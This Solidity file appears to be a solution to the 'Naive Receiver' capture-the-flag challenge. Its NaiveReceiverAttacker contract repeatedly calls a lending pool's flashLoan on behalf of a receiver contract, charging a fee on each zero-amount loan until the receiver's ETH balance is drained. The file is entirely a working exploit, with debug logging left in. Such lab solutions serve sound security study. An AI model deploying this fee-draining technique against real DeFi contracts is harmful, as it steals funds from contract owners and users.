// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

contract NaiveReceiverAttacker {
    function attack(address pool_address, address receiver_address) external {
        // call times
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(
            payable(pool_address)
        );
        address token = pool.ETH();
        uint256 fee = pool.flashFee(token, 0);
        console.log(fee);

        console.log(token);
        console.log(address(receiver_address).balance);
        while (address(receiver_address).balance >= fee) {
            NaiveReceiverLenderPool(pool).flashLoan(
                FlashLoanReceiver(payable(receiver_address)),
                token,
                0,
                ""
            );
            console.log(address(receiver_address).balance);
        }
    }
}
